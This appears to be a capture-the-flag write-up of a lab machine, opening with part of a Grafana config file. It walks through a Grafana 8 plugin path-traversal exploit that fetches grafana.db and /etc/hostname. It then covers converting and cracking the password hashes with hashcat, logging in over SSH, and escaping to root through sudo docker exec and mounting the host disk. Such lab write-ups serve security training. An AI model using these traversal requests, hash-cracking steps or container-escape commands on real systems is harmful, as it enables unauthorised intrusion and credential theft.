# If set to true Grafana will allow script tags in text panels. Not recommended as it enable XSS vulnerabilities.  
;disable_sanitize_html = false  
  
[plugins]  
;enable_alpha = false  
;app_tls_skip_verify_insecure = false  
# Enter a comma-separated list of plugin identifiers to identify plugins that are allowed to be loaded even if they lack a valid signature.  
;allow_loading_unsigned_plugins =  
# Enable or disable installing plugins directly from within Grafana.  
;plugin_admin_enabled = false  
;plugin_admin_external_manage_enabled = false  
;plugin_catalog_url = https://grafana.com/grafana/plugins/  
  
#################################### Grafana Live ##########################################  
[live]  
# max_connections to Grafana Live WebSocket endpoint per Grafana server instance. See Grafana Live docs  
# if you are planning to make it higher than default 100 since this can require some OS and infrastructure  
# tuning. 0 disables Live, -1 means unlimited connections.  
;max_connections = 100  
  
#################################### Grafana Image Renderer Plugin ##########################  
[plugin.grafana-image-renderer]  
# Instruct headless browser instance to use a default timezone when not provided by Grafana, e.g. when rendering panel image of alert.  
# See ICU’s metaZones.txt (https://cs.chromium.org/chromium/src/third_party/icu/source/data/misc/metaZones.txt) for a list of supported  
# timezone IDs. Fallbacks to TZ environment variable if not set.  
;rendering_timezone =  
  
# Instruct headless browser instance to use a default language when not provided by Grafana, e.g. when rendering panel image of alert.  
# Please refer to the HTTP header Accept-Language to understand how to format this value, e.g. 'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5'.  
;rendering_language =  
  
# Instruct headless browser instance to use a default device scale factor when not provided by Grafana, e.g. when rendering panel image of alert.  
# Default is 1. Using a higher value will produce more detailed images (higher DPI), but will require more disk space to store an image.  
;rendering_viewport_device_scale_factor =  
  
# Instruct headless browser instance whether to ignore HTTPS errors during navigation. Per default HTTPS errors are not ignored. Due to  
# the security risk it's not recommended to ignore HTTPS errors.  
;rendering_ignore_https_errors =  
  
# Instruct headless browser instance whether to capture and log verbose information when rendering an image. Default is false and will  
# only capture and log error messages. When enabled, debug messages are captured and logged as well.  
# For the verbose information to be included in the Grafana server log you have to adjust the rendering log level to debug, configure  
# [log].filter = rendering:debug.  
;rendering_verbose_logging =  
  
# Instruct headless browser instance whether to output its debug and error messages into running process of remote rendering service.  
# Default is false. This can be useful to enable (true) when troubleshooting.  
;rendering_dumpio =  
  
# Additional arguments to pass to the headless browser instance. Default is --no-sandbox. The list of Chromium flags can be found  
# here (https://peter.sh/experiments/chromium-command-line-switches/). Multiple arguments is separated with comma-character.  
;rendering_args =  
  
# You can configure the plugin to use a different browser binary instead of the pre-packaged version of Chromium.  
# Please note that this is not recommended, since you may encounter problems if the installed version of Chrome/Chromium is not  
# compatible with the plugin.  
;rendering_chrome_bin =  
  
# Instruct how headless browser instances are created. Default is 'default' and will create a new browser instance on each request.  
# Mode 'clustered' will make sure that only a maximum of browsers/incognito pages can execute concurrently.  
# Mode 'reusable' will have one browser instance and will create a new incognito page on each request.  
;rendering_mode =  
  
# When rendering_mode = clustered you can instruct how many browsers or incognito pages can execute concurrently. Default is 'browser'  
# and will cluster using browser instances.  
# Mode 'context' will cluster using incognito pages.  
;rendering_clustering_mode =  
# When rendering_mode = clustered you can define maximum number of browser instances/incognito pages that can execute concurrently..  
;rendering_clustering_max_concurrency =  
  
# Limit the maximum viewport width, height and device scale factor that can be requested.  
;rendering_viewport_max_width =  
;rendering_viewport_max_height =  
;rendering_viewport_max_device_scale_factor =  
  
# Change the listening host and port of the gRPC server. Default host is 127.0.0.1 and default port is 0 and will automatically assign  
# a port not in use.  
;grpc_host =  
;grpc_port =  
  
[enterprise]  
# Path to a valid Grafana Enterprise license.jwt file  
;license_path =  
  
[feature_toggles]  
# enable features, separated by spaces  
;enable =  
  
[date_formats]  
# For information on what formatting patterns that are supported https://momentjs.com/docs/#/displaying/  
  
# Default system date format used in time range picker and other places where full time is displayed  
;full_date = YYYY-MM-DD HH:mm:ss  
  
# Used by graph and other places where we only show small intervals  
;interval_second = HH:mm:ss  
;interval_minute = HH:mm  
;interval_hour = MM/DD HH:mm  
;interval_day = MM/DD  
;interval_month = YYYY-MM  
;interval_year = YYYY  
  
# Experimental feature  
;use_browser_locale = false  
  
# Default timezone for user preferences. Options are 'browser' for the browser local timezone or a timezone name from IANA Time Zone database, e.g. 'UTC' or 'Europe/Amsterdam' etc.  
;default_timezone = browser  
  
[expressions]  
# Enable or disable the expressions functionality.  
;enabled = true
```

In the metasploit framework console we saw :

```bash
[+] Detected vulnerable Grafana: 8.0.0  
[*] 10.129.234.47 - Progress   0/40 (0.0%)  
[+] alertlist was found and exploited successfully
```

Confirming the version of Grafana and that there was an alertlist path.

So we will curl using URL-encoded path `..%2F` which is the equivalent of `../` to try to reach the database by going up towards root.

```bash
>  curl -s --path-as-is \  
> 'http://data.htb:3000/public/plugins/alertlist..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2var%2Flib%2Fgrafana.db' \  
  
  
  
400 Bad Request%

#Syntax Error : forgot the / after alertlist
>  curl -s --path-as-is \  
> 'http://data.htb:3000/public/plugins/alertlist/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fvar%2Flib%2Fgrafana%2Fgrafana.db' \  
> -o ~/grafana.db \                                                                             
> file ~/grafana.db \                                                            
> ls -lh ~/grafana.db            
Unknown category provided, here is a list of all categories:  
  
auth        Authentication methods  
connection  Manage connections  
curl        The command line tool itself  
deprecated  Legacy  
dns         Names and resolving  
file        FILE protocol  
ftp         FTP protocol  
global      Global options  
http        HTTP and HTTPS protocol  
imap        IMAP protocol  
ldap        LDAP protocol  
output      File system output  
pop3        POP3 protocol  
post        HTTP POST specific  
proxy       Options for proxies  
scp         SCP protocol  
sftp        SFTP protocol  
smtp        SMTP protocol  
ssh         SSH protocol  
telnet      TELNET protocol  
tftp        TFTP protocol  
timeout     Timeouts and delays  
tls         TLS/SSL related  
upload      Upload, sending data  
verbose     Tracing, logging etc

# Another syntax error, not supposed to \ after -o ~/grafana.db

>  curl -s --path-as-is \  
> 'http://data.htb:3000/public/plugins/alertlist/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fvar%2Flib%2Fgrafana%2Fgrafana.db' \  
> -o ~/grafana.db && file ~/grafana.db && ls -lh ~/grafana.db                                   
/home/vagabond/grafana.db: SQLite 3.x database, last written using SQLite version 3035004, file counter 363, database pages 146, cookie 0x109, schema 4, UTF-8, version-valid-for 363  
-rw-r--r-- 1 vagabond vagabond 584K May 21 10:39 /home/vagabond/grafana.db
```

Finally, after 20 minutes, I got the syntax right.

```bash
>  sqlite3 ~/grafana.db "SELECT id, login, email, password FROM user;"  
╭────┬───────┬─────────────────┬──────────────────────────────────────────────────────────────────────────────────────────────────────╮  
│ id │ login │      email      │                                               password                                               │  
╞════╪═══════╪═════════════════╪══════════════════════════════════════════════════════════════════════════════════════════════════════╡  
│  1 │ admin │ admin@localhost │ 7a919e4bbe95cf5104edf354ee2e6234efac1ca1f81426844a24c4df6131322cf3723c92164b6172e9e73faf7a4c2072f8f8 │  
│  2 │ boris │ boris@data.vl   │ dc6becccbb57d34daf4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3cbe49353e35f53b51da8 │  
╰────┴───────┴─────────────────┴──────────────────────────────────────────────────────────────────────────────────────────────────────╯
```

These gave me hashes for "admin" and "boris".

Python script to decode their hashes :

```python
#!/usr/bin/env python3
import base64
import binascii
import sys

# Paste from sqlite output for ONE user:
PASSWORD_HEX = "dc6becccbb57d34daf4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3cbe49353e35f53b51da8"
SALT_STR = "PASTE_SALT_FROM_SQLITE"

ITERATIONS = 10000

raw = binascii.unhexlify(PASSWORD_HEX)
hash_b64 = base64.b64encode(raw).decode()
salt_b64 = base64.b64encode(SALT_STR.encode()).decode()

print(f"sha256:{ITERATIONS}:{salt_b64}:{hash_b64}")
```

```bash
>  python3 hashsqlite.py > hashboris.txt  
>  cat hashboris.txt  
sha256:10000:UEFTVEVfU0FMVF9GUk9NX1NRTElURQ==:3GvszLtX002vSk45HSAV0zUMYN82COnpm1KR5H8+XNOdFWviIHRb48vkk1PjX1O1Hag=

# Modified the script to get the Admin's sha256 as well

>  python3 hashsqlite.py > hashadmin.txt  
>  cat hashadmin.txt  
sha256:10000:UEFTVEVfU0FMVF9GUk9NX1NRTElURQ==:epGeS76Vz1EE7fNU7i5iNO+sHKH4FCaESiTE32ExMizzcjySFkthcunnP696TCBy+Pg=
```

This would take too much time, so I have to use the salt from the database and a more complex python script :

```bash
>  sqlite3 ~/grafana.db "SELECT login, password, salt FROM user;"  
  
╭───────┬──────────────────────────────────────────────────────────────────────────────────────────────────────┬────────────╮  
│ login │                                               password                                               │    salt    │  
╞═══════╪══════════════════════════════════════════════════════════════════════════════════════════════════════╪════════════╡  
│ admin │ 7a919e4bbe95cf5104edf354ee2e6234efac1ca1f81426844a24c4df6131322cf3723c92164b6172e9e73faf7a4c2072f8f8 │ YObSoLj55S │  
│ boris │ dc6becccbb57d34daf4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3cbe49353e35f53b51da8 │ LCBhdtJWjl │  
╰───────┴──────────────────────────────────────────────────────────────────────────────────────────────────────┴────────────╯
```

```python
"""Convert Grafana 8.x PBKDF2-HMAC-SHA256 hashes to Hashcat mode 10900."""

  

import base64

import binascii

import sys

  

ITERATIONS = 10000

  

USERS = {

"admin": {

"password_hex": (

"7a919e4bbe95cf5104edf354ee2e6234efac1ca1f81426844a24c4df6131322"

"cf3723c92164b6172e9e73faf7a4c2072f8f8"

),

"salt": "YObSoLj55S",

},

"boris": {

"password_hex": (

"dc6becccbb57d34daf4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be"

"220745be3cbe49353e35f53b51da8"

),

"salt": "LCBhdtJWjl",

},

}

  
  

def to_hashcat(password_hex: str, salt: str) -> str:

try:

raw = binascii.unhexlify(password_hex)

except (binascii.Error, ValueError) as e:

raise SystemExit(f"Invalid password hex: {e}") from e

  

hash_b64 = base64.b64encode(raw).decode()

salt_b64 = base64.b64encode(salt.encode()).decode()

return f"sha256:{ITERATIONS}:{salt_b64}:{hash_b64}"

  
  

def main() -> None:

targets = sys.argv[1:] if len(sys.argv) > 1 else list(USERS.keys())

  

for login in targets:

if login not in USERS:

print(f"# unknown user: {login}", file=sys.stderr)

continue

row = USERS[login]

print(f"# {login} salt={row['salt']}")

print(to_hashcat(row["password_hex"], row["salt"]))

  
  

if __name__ == "__main__":

main()
```

```bash
>  python3 hashsqlite.py > hashesgraf.txt
>  cat hashesgraf.txt  
# admin  salt=YObSoLj55S  
sha256:10000:WU9iU29MajU1Uw==:epGeS76Vz1EE7fNU7i5iNO+sHKH4FCaESiTE32ExMizzcjySFkthcunnP696TCBy+Pg=  
# boris  salt=LCBhdtJWjl  
sha256:10000:TENCaGR0SldqbA==:3GvszLtX002vSk45HSAV0zUMYN82COnpm1KR5H8+XNOdFWviIHRb48vkk1PjX1O1Hag=
```

So we move to cracking :

```bash
>  hashcat -m 10900 hashesgraf.txt /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt  
hashcat (v7.1.2) starting  
  
OpenCL API (OpenCL 3.0 PoCL 7.1  Linux, Release, RELOC, LLVM 20.1.8, SLEEF, DISTRO, CUDA, POCL_DEBUG) - Platform #1 [The pocl project]  
======================================================================================================================================  
* Device #01: cpu-haswell-AMD Ryzen 5 3500U with Radeon Vega Mobile Gfx, 8912/17824 MB (8912 MB allocatable), 8MCU  
  
Minimum password length supported by kernel: 0  
Maximum password length supported by kernel: 256  
Minimum salt length supported by kernel: 0  
Maximum salt length supported by kernel: 256  
  
Hashfile 'hashesgraf.txt' on line 1 (# admin  salt=YObSoLj55S): Separator unmatched  
Hashfile 'hashesgraf.txt' on line 3 (# boris  salt=LCBhdtJWjl): Separator unmatched  
Hashes: 2 digests; 2 unique digests, 2 unique salts  
Bitmaps: 16 bits, 65536 entries, 0x0000ffff mask, 262144 bytes, 5/13 rotates  
Rules: 1  
  
Optimizers applied:  
* Zero-Byte  
* Slow-Hash-SIMD-LOOP  
  
Watchdog: Temperature abort trigger set to 90c  
  
Host memory allocated for this attack: 514 MB (12574 MB free)  
  
Dictionary cache hit:  
* Filename..: /usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt  
* Passwords.: 14344384  
* Bytes.....: 139921497  
* Keyspace..: 14344384  
  
sha256:10000:TENCaGR0SldqbA==:3GvszLtX002vSk45HSAV0zUMYN82COnpm1KR5H8+XNOdFWviIHRb48vkk1PjX1O1Hag=:beautiful1
```

We got boris' password.

```bash
>  ssh boris@10.129.234.47  
** WARNING: connection is not using a post-quantum key exchange algorithm.  
** This session may be vulnerable to "store now, decrypt later" attacks.  
** The server may need to be upgraded. See https://openssh.com/pq.html  
Welcome to Ubuntu 18.04.6 LTS (GNU/Linux 5.4.0-1103-aws x86_64)  
  
* Documentation:  https://help.ubuntu.com  
* Management:     https://landscape.canonical.com  
* Support:        https://ubuntu.com/pro  
  
 System information as of Thu May 21 09:42:06 UTC 2026  
  
 System load:  0.04              Processes:              207  
 Usage of /:   38.6% of 4.78GB   Users logged in:        0  
 Memory usage: 15%               IP address for eth0:    10.129.234.47  
 Swap usage:   0%                IP address for docker0: 172.17.0.1  
  
  
Expanded Security Maintenance for Infrastructure is not enabled.  
  
0 updates can be applied immediately.  
  
122 additional security updates can be applied with ESM Infra.  
Learn more about enabling ESM Infra service for Ubuntu 18.04 at  
https://ubuntu.com/18-04  
  
  
Last login: Wed Jun  4 13:37:31 2025 from 10.10.14.62  
boris@data:~$ ls  
user.txt  
boris@data:~$ cat user.txt  
955e*****************5898
```

We got the user flag.

```bash
boris@data:~$ sudo -l  
Matching Defaults entries for boris on localhost:  
   env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin  
  
User boris may run the following commands on localhost:  
   (root) NOPASSWD: /snap/bin/docker exec *
```

This is good news, that means we can execute docker with admin privileges to PrivEsc.

```bash
boris@data:~$ sudo /snap/bin/docker ps  
[sudo] password for boris:    
Sorry, user boris is not allowed to execute '/snap/bin/docker ps' as root on localhost.
```

So we try to find the hostname via traversal :

```bash
>  curl -s --path-as-is \  
'http://data.htb:3000/public/plugins/alertlist/..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2F..%2Fetc%2Fhostname'  
e6ff5b1cbc85
```

Back on boris :

```bash
boris@data:~$ sudo /snap/bin/docker exec -u root -it e6ff5b1cbc85 /bin/bash  
bash-5.1# whoami  
root  
bash-5.1#
bash-5.1# cd /  
bash-5.1# ls  
bin     dev     etc     home    lib     lib64   media   mnt     opt     proc    root    run     run.sh  sbin    srv     sys     tmp     usr     var
```

Since we are running on a container, we actually need to mount the root disk which is /dev/sdX

```bash
bash-5.1# mkdir /mnt/usb
bash-5.1# mount /dev/sda1 /mnt
bash-5.1# ls -la /mnt/root  
total 36  
drwx------    7 root     root          4096 May 21 07:23 .  
drwxr-xr-x   23 root     root          4096 Jun  4  2025 ..  
lrwxrwxrwx    1 root     root             9 Jan 23  2022 .bash_history -> /dev/null  
drwx------    2 root     root          4096 Apr  9  2025 .cache  
drwx------    3 root     root          4096 Apr  9  2025 .gnupg  
drwxr-xr-x    3 root     root          4096 Jan 23  2022 .local  
-rw-r--r--    1 root     root           148 Aug 17  2015 .profile  
drwx------    2 root     root          4096 Jan 23  2022 .ssh  
-rw-r-----    1 root     root            33 May 21 07:23 root.txt  
drwxr-xr-x    4 root     root          4096 Jan 23  2022 snap
```

And, bingo.

```bash
bash-5.1# cat /mnt/root/root.txt  
82cf16******************060f04ca
```

First Linux Black Box finished and second Black Box engagement finished !

Additional Deep Enumeration :

```bash
bash-5.1# id  
uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel),11(floppy),20(dialout),26(tape),27(video)  
bash-5.1# cat /etc/os-release  
NAME="Alpine Linux"  
ID=alpine  
VERSION_ID=3.13.5  
PRETTY_NAME="Alpine Linux v3.13"  
HOME_URL="https://alpinelinux.org/"  
BUG_REPORT_URL="https://bugs.alpinelinux.org/"  
bash-5.1# cat /etc/issue  
Welcome to Alpine Linux 3.13  
Kernel \r on an \m (\l)  
bash-5.1# find / -type f perm -4000 -o -perm -2000 2>/dev/null | head -20  
bash-5.1# ls -la /etc/cron*  
total 12  
drwxr-xr-x    2 root     root          4096 Apr 14  2021 .  
drwxr-xr-x    1 root     root          4096 Apr  9  2025 ..  
-rw-------    1 root     root           283 Jun 19  2020 root
bash-5.1# ls -la /var/spool/cron/crontabs  
lrwxrwxrwx    1 root     root            13 Apr 14  2021 /var/spool/cron/crontabs -> /etc/crontabs
5.4.0-1103-aws
boris@data:~$ docker --version  
Docker version 20.10.8, build 3967b7d28e
boris@data:~$ getcap -r / 2>/dev/null  
/usr/bin/mtr-packet = cap_net_raw+ep
```

Bonus : alternative way to decode the hashes without python

```bash
PASS_HEX="dc6becccbb57d34daf4a4e391d2015d3350c60df3608e9e99b5291e47f3e5cd39d156be220745be3cbe49353e35f53b51da8"
SALT="LCBhdtJWjl"
HASH_B64=$(echo -n "$PASS_HEX" | xxd -r -p | base64 -w0)
SALT_B64=$(echo -n "$SALT" | base64 -w0)
echo "sha256:10000:${SALT_B64}:${HASH_B64}" > ~/hash-boris.txt 
>  hashcat -m 10900 ~/hashboris.txt /usr/share/wordlists/rockyou.txt --show
Sk45HSAV0zUMYN82COnpm1KR5H8+XNOdFWviIHRb48vkk1PjX1O1Hag=:beautiful1 
```
